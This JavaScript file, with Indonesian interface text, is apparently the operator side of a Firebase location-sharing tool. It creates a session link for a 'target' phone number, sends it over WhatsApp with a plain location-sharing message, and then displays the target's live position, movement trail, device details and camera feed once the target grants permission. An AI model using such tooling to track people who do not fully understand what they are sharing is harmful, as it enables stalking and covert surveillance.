import { db } from "./firebase-config.js";
import { ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const phoneInput = document.getElementById("phoneInput");
const createBtn = document.getElementById("createLinkBtn");
const shareLinkInput = document.getElementById("shareLink");
const copyBtn = document.getElementById("copyBtn");
const waBtn = document.getElementById("waBtn");
const statusText = document.getElementById("statusText");
const topStatus = document.getElementById("topStatus");
const coordBadge = document.getElementById("coordBadge");
const connState = document.getElementById("connState");
const teleCoords = document.getElementById("teleCoords");
const teleAccuracy = document.getElementById("teleAccuracy");
const teleDevice = document.getElementById("teleDevice");
const teleUpdated = document.getElementById("teleUpdated");
const remoteVideo = document.getElementById("remoteVideo");
const camStatus = document.getElementById("camStatus");
const streamNote = document.getElementById("streamNote");

const notifBanner = document.getElementById("notifBanner");
const notifText = document.getElementById("notifText");
const notifClose = document.getElementById("notifClose");

let notifTimer = null;
let map, marker, polyline;
let unsubscribeSession = null;

function showNotif(message, type = "success") {
  if (!notifBanner || !notifText) {
    alert(message);
    return;
  }
  notifText.textContent = message;
  notifBanner.classList.remove("hidden", "success", "error");
  notifBanner.classList.add(type);

  clearTimeout(notifTimer);
  notifTimer = setTimeout(() => {
    notifBanner.classList.add("hidden");
  }, 4500);
}

if (notifClose && notifBanner) {
  notifClose.addEventListener("click", () => {
    notifBanner.classList.add("hidden");
  });
}

if (document.getElementById("map") && typeof L !== "undefined") {
  map = L.map("map").setView([-6.2, 106.8166], 12);
  L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
    attribution: "&copy; OpenStreetMap"
  }).addTo(map);
  polyline = L.polyline([], { color: "#00e5ff", weight: 4 }).addTo(map);
}

function makeSessionId() {
  return "vx_" + Date.now().toString(36) + "_" + Math.random().toString(36).substring(2, 6);
}

function formatTime(ts) {
  if (!ts) return "-";
  return new Date(ts).toLocaleTimeString("id-ID", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit"
  });
}

if (createBtn) {
  createBtn.addEventListener("click", async () => {
    const phone = (phoneInput?.value || "").trim();
    if (!phone) {
      showNotif("Gagal: Masukkan nomor HP target terlebih dahulu.", "error");
      phoneInput?.focus();
      return;
    }

    const sessionId = makeSessionId();
    const baseDir = window.location.pathname.replace(/[^/]*$/, "");
    const link = `${window.location.origin}${baseDir}share.html?session=${sessionId}`;

    if (shareLinkInput) shareLinkInput.value = link;
    if (topStatus) topStatus.textContent = "Menyimpan...";
    createBtn.disabled = true;

    try {
      await set(ref(db, "sessions/" + sessionId), {
        phone,
        status: "Menunggu Persetujuan",
        createdAt: Date.now()
      });

      if (topStatus) topStatus.textContent = "Tautan Aktif";
      if (statusText) {
        statusText.innerHTML = `Target: <b>${phone}</b> | Status: <b>Menunggu Persetujuan</b>`;
      }
      if (connState) {
        connState.textContent = "Menunggu Target";
        connState.className = "conn-badge offline";
      }

      showNotif("Berhasil! Tautan berbagi lokasi telah dibuat dan tersimpan.", "success");
      listenSession(sessionId, phone);
    } catch (err) {
      if (topStatus) topStatus.textContent = "Gagal";
      showNotif(
        `Gagal membuat sesi: ${err?.message || "Periksa konfigurasi & Rules Firebase Realtime Database"}.`,
        "error"
      );
    } finally {
      createBtn.disabled = false;
    }
  });
}

function listenSession(sessionId, phone) {
  if (typeof unsubscribeSession === "function") {
    unsubscribeSession();
  }

  unsubscribeSession = onValue(ref(db, "sessions/" + sessionId), (snap) => {
    const data = snap.val();
    if (!data) return;

    const currentStatus = data.status || "Menunggu Persetujuan";
    const isConnected =
      Boolean(data.connected) ||
      Boolean(data.device) ||
      (typeof data.lat === "number" && typeof data.lng === "number");

    if (statusText) {
      statusText.innerHTML = `Target: <b>${phone}</b> | Status: <b>${currentStatus}</b>`;
    }

    if (connState) {
      if (isConnected) {
        connState.textContent = "Terhubung";
        connState.className = "conn-badge online";
        if (topStatus) topStatus.textContent = "Live";
      } else {
        connState.textContent = "Menunggu Target";
        connState.className = "conn-badge offline";
      }
    }

    if (teleDevice && data.device) {
      teleDevice.textContent = data.device;
    }

    if (teleUpdated && (data.updatedAt || data.createdAt)) {
      teleUpdated.textContent = formatTime(data.updatedAt || data.createdAt);
    }

    if (typeof data.lat === "number" && typeof data.lng === "number") {
      const latStr = data.lat.toFixed(6);
      const lngStr = data.lng.toFixed(6);

      if (coordBadge) coordBadge.textContent = `Lat: ${latStr} | Lng: ${lngStr}`;
      if (teleCoords) teleCoords.textContent = `${latStr}, ${lngStr}`;
      if (teleAccuracy) {
        const acc = typeof data.accuracy === "number" ? `±${Math.round(data.accuracy)} m` : "-";
        const spd = typeof data.speed === "number" && data.speed > 0 ? ` • ${(data.speed * 3.6).toFixed(1)} km/j` : "";
        teleAccuracy.textContent = `${acc}${spd}`;
      }

      if (map) {
        const latlng = [data.lat, data.lng];
        if (!marker) {
          marker = L.marker(latlng).addTo(map);
        } else {
          marker.setLatLng(latlng);
        }
        polyline?.addLatLng(latlng);
        map.setView(latlng, 16);
      }
    }

    if (data.videoUrl && remoteVideo) {
      if (remoteVideo.src !== data.videoUrl) {
        remoteVideo.src = data.videoUrl;
      }
      if (camStatus) camStatus.textContent = "Live Video";
      if (streamNote) streamNote.textContent = "Siaran video aktif dari perangkat target.";
    } else if (data.cameraEnabled) {
      if (camStatus) camStatus.textContent = "Kamera Aktif";
      if (streamNote) {
        streamNote.textContent =
          "Kamera diizinkan oleh target. Untuk video langsung lintas perangkat, hubungkan stream ke pemutar video/WebRTC.";
      }
    } else {
      if (camStatus) camStatus.textContent = "Standby";
    }
  });
}

if (copyBtn && shareLinkInput) {
  copyBtn.addEventListener("click", async () => {
    if (!shareLinkInput.value) {
      showNotif("Gagal: Buat tautan terlebih dahulu sebelum menyalin.", "error");
      return;
    }
    try {
      await navigator.clipboard.writeText(shareLinkInput.value);
      showNotif("Berhasil! Tautan disalin ke clipboard.", "success");
    } catch {
      shareLinkInput.select();
      document.execCommand("copy");
      showNotif("Berhasil! Tautan disalin.", "success");
    }
  });
}

if (waBtn && shareLinkInput) {
  waBtn.addEventListener("click", () => {
    if (!shareLinkInput.value) {
      showNotif("Gagal: Buat tautan terlebih dahulu sebelum kirim ke WhatsApp.", "error");
      return;
    }
    const msg = encodeURIComponent(`Halo, buka tautan berbagi lokasi ini: ${shareLinkInput.value}`);
    window.open(`https://wa.me/?text=${msg}`, "_blank");
  });
}
